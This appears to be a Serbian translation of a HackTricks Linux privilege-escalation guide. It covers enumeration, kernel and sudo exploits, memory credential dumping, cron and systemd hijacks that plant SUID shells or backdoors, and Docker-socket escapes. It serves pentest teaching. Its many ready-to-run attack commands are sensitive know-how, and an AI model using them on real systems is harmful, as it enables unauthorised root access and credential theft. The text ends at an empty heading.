# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informacije o sistemu

### Informacije o OS-u

Počnimo sa prikupljanjem informacija o pokrenutom OS-u
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Putanja

Ako **imate prava za upis u bilo koji direktorijum unutar promenljive `PATH`**, možda ćete moći da hijack neke libraries ili binaries:
```bash
echo $PATH
```
### Informacije o okruženju

Postoje li zanimljive informacije, lozinke ili API ključevi u varijablama okruženja?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Proverite kernel verziju i da li postoji neki exploit koji može da se iskoristi za escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Možete pronaći dobar spisak ranjivih kernel verzija i neke već **compiled exploits** ovde: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Drugi sajtovi gde možete naći neke **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Da biste izvukli sve ranjive verzije kernela sa te web stranice možete uraditi:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Alati koji mogu pomoći pri pretrazi kernel exploits su:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (pokrenuti na žrtvi, proverava samo exploits za kernel 2.x)

Uvek **search the kernel version in Google**, možda je vaša kernel verzija navedena u nekom kernel exploitu i tako ćete biti sigurni da je exploit važeći.

Dodatna kernel exploitation tehnika:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo verzija

Na osnovu ranjivih sudo verzija koje se pojavljuju u:
```bash
searchsploit sudo
```
Možete proveriti da li je verzija sudo-a ranjiva koristeći ovaj grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Verzije sudo pre 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) omogućavaju lokalnim korisnicima bez privilegija da eskaliraju privilegije na root pomoću sudo `--chroot` opcije kada se fajl `/etc/nsswitch.conf` koristi iz direktorijuma pod kontrolom korisnika.

Evo [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) za exploit te [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Pre pokretanja exploita, uverite se da je vaša `sudo` verzija vulnerable i da podržava `chroot`.

Za više informacija, pogledajte originalni [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg verifikacija potpisa nije uspela

Proveri **smasher2 box of HTB** za **primer** kako bi ovaj vuln mogao biti iskorišćen
```bash
dmesg 2>/dev/null | grep "signature"
```
### Dalja sistemska enumeracija
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Nabrojte moguće odbrane

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Ako se nalazite u docker containeru, možete pokušati da pobegnete iz njega:


{{#ref}}
docker-security/
{{#endref}}

## Diskovi

Proverite **what is mounted and unmounted**, gde i zašto. Ako je nešto unmounted, možete pokušati da ga mount-ujete i proverite ima li privatnih informacija.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Korisni softver

Nabrojite korisne binarne fajlove
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Takođe, proverite da li je instaliran **any compiler**. Ovo je korisno ako treba da koristite neki kernel exploit, pošto se preporučuje da ga compile-ujete na mašini na kojoj ćete ga koristiti (ili na nekoj sličnoj).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Instaliran ranjiv softver

Proverite **verziju instaliranih paketa i servisa**. Možda postoji neka stara verzija Nagiosa (na primer) koja bi mogla biti iskorišćena za eskalaciju privilegija…\
Preporučuje se ručno proveriti verziju sumnjivijeg instaliranog softvera.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Imajte na umu da će ove komande prikazati mnogo informacija koje će većinom biti beskorisne, stoga se preporučuje korišćenje aplikacija kao što su OpenVAS ili sličnih koje će proveriti da li je neka instalirana verzija softvera ranjiva na poznate exploits_

## Procesi

Pogledajte **koji procesi** se izvršavaju i proverite da li neki proces ima **više privilegija nego što bi trebao** (možda tomcat koji se izvršava kao root?)
```bash
ps aux
ps -ef
top -n 1
```
Uvek proveri da li su pokrenuti [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detektuje ovo proverom `--inspect` parametra u komandnoj liniji procesa.\
Takođe **proveri svoje privilegije nad binarnim fajlovima procesa**, možda možeš prepisati nečiji.

### Praćenje procesa

Možeš koristiti alate kao što je [**pspy**](https://github.com/DominicBreuker/pspy) za praćenje procesa. Ovo može biti veoma korisno za identifikovanje ranjivih procesa koji se često izvršavaju ili kada su ispunjeni određeni uslovi.

### Memorija procesa

Neke usluge na serveru čuvaju **credentials in clear text inside the memory**.\
Obično ćeš morati imati **root privileges** da bi pročitao memoriju procesa koji pripadaju drugim korisnicima, zbog čega je ovo obično korisnije kada već imaš root i želiš otkriti više credentials.\
Međutim, zapamti da **kao običan korisnik možeš čitati memoriju procesa koje poseduješ**.

> [!WARNING]
> Imaj na umu da većina sistema danas **podrazumevano ne dozvoljava ptrace**, što znači da ne možeš dump-ovati druge procese koji pripadaju tvom neprivilegovanom korisniku.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

Ako imaš pristup memoriji FTP servisa (na primer) možeš dohvatiti Heap i pretražiti njegove credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB skripta
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Za dati process ID, **maps prikazuju kako je memorija mapirana unutar virtuelnog adresnog prostora tog procesa**; takođe prikazuju **dozvole svake mapirane regije**. Pseudo fajl **mem** **otkriva samu memoriju procesa**. Iz **maps** fajla znamo koje su **regije memorije čitljive** i njihove offsets. Koristimo ove informacije da **seek into the mem file and dump all readable regions** u fajl.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` omogućava pristup **fizičkoj** memoriji sistema, a ne virtuelnoj memoriji. Virtuelni adresni prostor kernela može se pristupiti koristeći /dev/kmem.\  
Obično je `/dev/mem` čitljiv samo korisniku **root** i grupi **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump je na Linuxu ponovo osmišljena verzija klasičnog ProcDump alata iz Sysinternals paketa alata za Windows. Preuzmite ga na [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Alati

Za dump memorije procesa možete koristiti:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Možete ručno ukloniti zahteve za root i dump procesa koji je u vašem vlasništvu
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (potreban je root)

### Kredencijali iz memorije procesa

#### Ručni primer

Ako primetite da se proces authenticator pokreće:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Možete dump the process (pogledajte prethodne sekcije da pronađete različite načine за dump the memory of a process) i pretražiti credentials unutar memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Alat [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) će ukrasti podatke za prijavu u čistom tekstu iz memorije i iz nekih dobro poznatih fajlova. Za ispravno funkcionisanje zahteva root privilegije.

| Funkcija                                          | Naziv procesa        |
| ------------------------------------------------- | -------------------- |
| GDM lozinka (Kali Desktop, Debian Desktop)        | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktivne FTP konekcije)                    | vsftpd               |
| Apache2 (aktivne HTTP Basic Auth sesije)         | apache2              |
| OpenSSH (aktivne SSH sesije - upotreba sudo)      | sshd:                |

#### Pretraga regexa/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zakazani/Cron poslovi

### Crontab UI (alseambusher) pokrenut kao root – web-bazirani scheduler privesc

Ako web “Crontab UI” panel (alseambusher/crontab-ui) radi kao root i vezan je samo na loopback, i dalje mu možete pristupiti preko SSH local port-forwarding i kreirati privilegovani job za eskalaciju.

Tipičan lanac
- Otkrivanje porta dostupanog samo na loopback-u (npr., 127.0.0.1:8000) i Basic-Auth realm pomoću `ss -ntlp` / `curl -v localhost:8000`
- Pronađi kredencijale u operativnim artefaktima:
- Backupi/skripte sa `zip -P <password>`
- systemd jedinica koja izlaže `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tuneluj i prijavi se:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Kreirajte high-priv job i pokrenite ga odmah (ostavlja SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Koristi ga:
```bash
/tmp/rootshell -p   # root shell
```
Ojačavanje
- Nemojte pokretati Crontab UI kao root; ograničite pristup pomoću posebnog korisnika i minimalnih ovlašćenja
- Ograničite vezivanje na localhost i dodatno ograničite pristup putem firewall/VPN; ne koristite iste lozinke ponovo
- Izbegavajte ugrađivanje tajni u unit files; koristite secret stores ili EnvironmentFile dostupan samo root-u
- Omogućite audit/logging za on-demand izvršavanje zadataka

Proverite da li je neki zakazani job ranjiv. Možda možete iskoristiti skriptu koja se izvršava kao root (wildcard vuln? možete menjati fajlove koje root koristi? iskoristiti symlinks? kreirati specifične fajlove u direktorijumu koje root koristi?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Na primer, u _/etc/crontab_ možete naći PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Pogledajte kako korisnik "user" ima privilegije pisanja nad /home/user_)

Ako u ovom crontab-u root korisnik pokuša da izvrši neku komandu ili skriptu bez podešenog PATH-a. Na пример: _\* \* \* \* root overwrite.sh_\
Tada možete dobiti root shell koristeći:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron koji pokreće skriptu sa wildcard-om (Wildcard Injection)

Ako skriptu pokreće root i u nekoj komandi postoji “**\***”, to možete iskoristiti da postignete neočekivane stvari (poput privesc). Primer:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ako se wildcard nalazi ispred putanje kao** _**/some/path/\***_ **, nije ranjiv (čak ni** _**./\***_ **nije).**

Pročitajte sledeću stranicu za više trikova za iskorišćavanje wildcard-a:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash izvršava parameter expansion i command substitution pre arithmetic evaluation u ((...)), $((...)) i let. Ako cron/parser koji radi kao root čita nepouzdana polja iz logova i ubacuje ih u arithmetic context, napadač može ubaciti command substitution $(...) koji se izvršava kao root kada cron pokrene.

- Zašto ovo funkcioniše: U Bash-u, expansions se dešavaju u ovom redu: parameter/variable expansion, command substitution, arithmetic expansion, zatim word splitting i pathname expansion. Dakle vrednost kao `$(/bin/bash -c 'id > /tmp/pwn')0` se prvo zameni (izvršava se komanda), zatim preostali numerički `0` se koristi za arithmetic pa skripta nastavlja bez grešaka.

- Tipičan ranjiv obrazac:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Eksploatacija: Naterajte da se u parsirani log upiše tekst pod kontrolom napadača tako da polje koje liči na broj sadrži command substitution i završi cifrom. Pazite da vaša komanda ne ispisuje na stdout (ili preusmerite izlaz) tako da arithmetic ostane validan.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Prepisivanje cron skripte i symlink

Ako **možete izmeniti cron skriptu** koju izvršava root, vrlo lako možete dobiti shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ako skripta koju izvršava root koristi **direktorijum na koji imate potpuni pristup**, možda bi bilo korisno obrisati taj folder i **napraviti symlink folder ka drugom** koji će služiti skripti pod vašom kontrolom
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Cron binarni fajlovi prilagođeno potpisani sa zapisljivim payload-om
Blue teams ponekad "potpisuju" binarne fajlove koje pokreće cron tako što izvlače prilagođenu ELF sekciju i koriste grep da pronađu vendor string pre nego što ih izvrše kao root. Ako je taj binary group-writable (npr. `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) i možete leak signing material, možete falsifikovati sekciju i preuzeti cron zadatak:

1. Use `pspy` to capture the verification flow. In Era, root ran `objcopy --dump-section .text_sig=text_sig_section.bin monitor` followed by `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` and then executed the file.
2. Ponovo kreirajte očekivani sertifikat koristeći leaked key/config (iz `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Napravite malicioznu zamenu (npr. ubacite SUID bash, dodajte svoj SSH key) i ugradite sertifikat u `.text_sig` tako da grep prođe:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Prepišite zakazani binary, pritom sačuvavši execute bitove:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Sačekajte sledeći cron run; kada naivna provera potpisa uspe, vaš payload će se izvršiti kao root.

### Česti cron poslovi

Možete pratiti procese da biste pronašli one koji se izvršavaju na svakih 1, 2 ili 5 minuta. Možda to možete iskoristiti i eskalirati privilegije.

Na primer, da biste **posmatrali svake 0.1s tokom 1 minut**, **sortirali po manje izvršenim komandama** i obrisali komande koje su se izvršavale najviše, možete uraditi:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Možete takođe koristiti** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (ovo će nadgledati i izlistati svaki proces koji se pokrene).

### Nevidljivi cron jobs

Moguće je kreirati cronjob stavljanjem carriage return-a nakon komentara (bez newline karaktera), i cron job će raditi. Primer (obratite pažnju na carriage return karakter):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servisi

### Upisivi _.service_ fajlovi

Proverite da li možete da upišete bilo koji `.service` fajl, ako možete, možete ga **izmeniti** tako da **pokreće** vaš **backdoor kada** se servis **pokrene**, **restartuje** ili **zaustavi** (možda ćete morati da sačekate da se mašina restartuje).\
Na primer, kreirajte vaš backdoor unutar .service fajla sa **`ExecStart=/tmp/script.sh`**

### Upisivi binarni fajlovi servisa

Imajte na umu da ako imate **write permissions over binaries being executed by services**, možete ih promeniti za backdoors tako da kada se servisi ponovo izvrše backdoors budu izvršeni.

### systemd PATH - Relativne putanje

Možete videti PATH koji koristi **systemd** pomoću:
```bash
systemctl show-environment
```
Ako otkrijete da možete **pisati** u bilo kojem od direktorijuma na putanji, možda ćete moći da **escalate privileges**. Treba da tražite **relativne putanje koje se koriste u konfiguracionim fajlovima servisa** kao što su:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Zatim kreirajte **izvršni fajl** sa **istem imenom kao relativni put binarnog fajla** unutar systemd PATH foldera u koji imate pravo pisanja, i kada se servisu zatraži izvršenje ranjive akcije (**Start**, **Stop**, **Reload**), vaš **backdoor će se izvršiti** (neprivilegovani korisnici obično ne mogu da startuju/stopiraju servise, ali proverite da li možete da koristite `sudo -l`).

**Saznajte više o servisima pomoću `man systemd.service`.**

## **Tajmeri**

**Tajmeri** su systemd unit fajlovi čije ime se završava u `**.timer**` i koji kontrolišu `**.service**` fajlove ili događaje. **Tajmeri** se mogu koristiti kao alternativa cron-u jer imaju ugrađenu podršku za događaje zasnovane na kalendarskom vremenu i monotoničkom vremenu i mogu se izvršavati asinhrono.

Možete izlistati sve tajmere pomoću:
```bash
systemctl list-timers --all
```
### Upisivi tajmeri

Ako možete izmeniti tajmer, možete ga naterati da pokrene neke postojeće systemd.unit (kao što su `.service` ili `.target`)
```bash
Unit=backdoor.service
```
U dokumentaciji možete pročitati šta je Unit:

> Jedinica koja se aktivira kada ovaj timer istekne. Argument je ime jedinice, čiji sufiks nije ".timer". Ako nije navedeno, ova vrednost podrazumevano ukazuje na service koji ima isto ime kao timer jedinica, osim sufiksa. (Vidi gore.) Preporučuje se da ime jedinice koja se aktivira i ime timer jedinice budu identična, osim sufiksa.

Dakle, da biste zloupotrebili ovu dozvolu, trebalo bi da:

- Pronađite neku systemd jedinicu (npr. `.service`) koja **executing a writable binary**
- Pronađite neku systemd jedinicu koja **executing a relative path** i nad kojom imate **writable privileges** nad **systemd PATH** (da biste impersonirali taj executable)

Više o timer-ima pročitajte u `man systemd.timer`.

### **Omogućavanje timera**

Da omogućite timer, potrebne su root privilegije i morate izvršiti:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Imajte na umu da je **timer** **aktiviran** kreiranjem simboličkog linka ka njemu u `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) omogućavaju **komunikaciju procesa** na istoj ili različitim mašinama u okviru klijent-server modela. Koriste standardne Unix descriptor fajlove za međumašinsku komunikaciju i podešavaju se pomoću `.socket` datoteka.

Sockets se mogu konfigurisati koristeći `.socket` datoteke.

**Saznajte više o sockets uz `man systemd.socket`.** U ovoj datoteci može se podesiti nekoliko interesantnih parametara:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ove opcije se razlikuju, ali u suštini služe da **naznače gde će se slušati** socket (putanja AF_UNIX socket fajla, IPv4/6 i/ili broj porta na kojem će se slušati, itd.)
- `Accept`: Prima boolean argument. Ako je **true**, za svaku dolaznu konekciju se pokreće zasebna instanca servisa i samo konekcioni socket joj se prosleđuje. Ako je **false**, svi listening sockets sami se **prosleđuju pokrenutoj service jedinici**, i za sve konekcije se pokreće samo jedna service jedinica. Ova vrednost se ignoriše za datagram sockets i FIFO-e gde jedna service jedinica bezuslovno obrađuje sav dolazni saobraćaj. **Podrazumevano je false**. Iz razloga performansi preporučuje se da novi daemon-i budu pisani tako da odgovaraju `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Prima jednu ili više komandnih linija, koje se **izvršavaju pre** odnosno **posle** nego što su listening **sockets**/FIFO-i **kreirani** i vezani. Prvi token komandne linije mora biti apsolutno ime fajla, nakon čega slede argumenti procesa.
- `ExecStopPre`, `ExecStopPost`: Dodatne **komande** koje se **izvršavaju pre** ili **posle** nego što su listening **sockets**/FIFO-i **zatvoreni** i uklonjeni, redom.
- `Service`: Navodi ime **service** jedinice koje će se **aktivirati** na **dolazni saobraćaj**. Ova opcija je dozvoljena samo za sockets sa `Accept=no`. Podrazumevano pokazuje na servis koji ima isto ime kao socket (sa zamenjenim sufiksom). U većini slučajeva nije neophodno koristiti ovu opciju.

### Upisive .socket datoteke

Ako pronađete **upisivu** `.socket` datoteku možete **dodati** na početak `[Socket]` sekcije nešto poput: `ExecStartPre=/home/kali/sys/backdoor` i backdoor će biti izvršen pre nego što se socket kreira. Dakle, verovatno ćete morati da sačekate da se mašina restartuje.\
_Napomena: sistem mora koristiti tu konfiguraciju socket datoteke da backdoor bude izvršen_

### Upisivi sockets

Ako **identifikujete bilo koji upisiv socket** (_sada govorimo o Unix Sockets i ne o konfig `.socket` datotekama_), onda **možete komunicirati** sa tim socketom i možda iskoristiti neku ranjivost.

### Enumerisanje Unix Sockets
```bash
netstat -a -p --unix
```
### Sirova veza
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Primer eksploatacije:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Obratite pažnju da može postojati nekoliko **sockets koji slušaju HTTP** zahteva (_ne mislim na .socket fajlove već na fajlove koji se ponašaju kao unix sockets_). Možete to proveriti pomoću:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Ako socket **responds with an HTTP** request, onda možete **communicate** sa njim i možda **exploit some vulnerability**.

### Docker socket dostupan za pisanje

Docker socket, često se nalazi na `/var/run/docker.sock`, je kritičan fajl koji treba biti zaštićen. Podrazumevano, može da se piše od strane korisnika `root` i članova grupe `docker`. Posedovanje pristupa za pisanje ovom socketu može dovesti do privilege escalation. Ovde je prikaz kako se to može uraditi i alternativne metode ako Docker CLI nije dostupan.

#### **Privilege Escalation with Docker CLI**

Ako imate pristup za pisanje Docker socketa, možete escalate privileges koristeći sledeće komande:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ove komande vam omogućavaju da pokrenete container sa root pristupom na fajl sistem hosta.

#### **Direktno korišćenje Docker API-ja**

U slučajevima kada Docker CLI nije dostupan, Docker socket se i dalje može manipulisati koristeći Docker API i `curl` komande.

1.  **List Docker Images:** Dohvatite listu dostupnih image-ova.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Pošaljite zahtev za kreiranje containera koji mount-uje root direktorijum host sistema.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Koristite `socat` da uspostavite konekciju sa containerom, omogućavajući izvršavanje komandi unutar njega.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nakon uspostavljanja `socat` konekcije, možete izvršavati komande direktno u containeru sa root pristupom fajl sistemu hosta.

### Ostalo

Imajte na umu da ako imate pravo pisanja nad docker socket-om zato što ste **u grupi `docker`** imate [**više načina za eskalaciju privilegija**](interesting-groups-linux-pe/index.html#docker-group). Ako [**docker API sluša na portu** takođe ga možete kompromitovati](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Pogledajte **još načina za izlazak iz docker-a ili zloupotrebu za eskalaciju privilegija** u:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) eskalacija privilegija

Ako otkrijete da možete koristiti **`ctr`** komandu, pročitajte sledeću stranicu jer **možda možete zloupotrebiti istu za eskalaciju privilegija**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** eskalacija privilegija

